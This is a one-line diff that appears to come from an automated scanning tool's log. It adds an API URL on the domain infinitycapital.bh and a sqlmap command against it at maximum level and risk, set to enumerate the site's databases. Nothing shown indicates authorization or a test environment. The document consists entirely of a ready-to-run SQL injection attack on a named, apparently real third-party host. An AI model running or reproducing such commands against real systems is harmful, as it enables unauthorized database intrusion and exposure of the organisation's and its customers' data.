@@ -1,0 +1,1 @@
+https://www.infinitycapital.bh/api/?id=1&page=2 (GET)  # /usr/bin/sqlmap -u https://www.infinitycapital.bh/api/?id=1&page=2 --batch --level=5 --risk=3 --dbs --threads=4 --timeout=15 --retries=1 --output-dir=tool_outputs/sqlmap/8bdde4b7
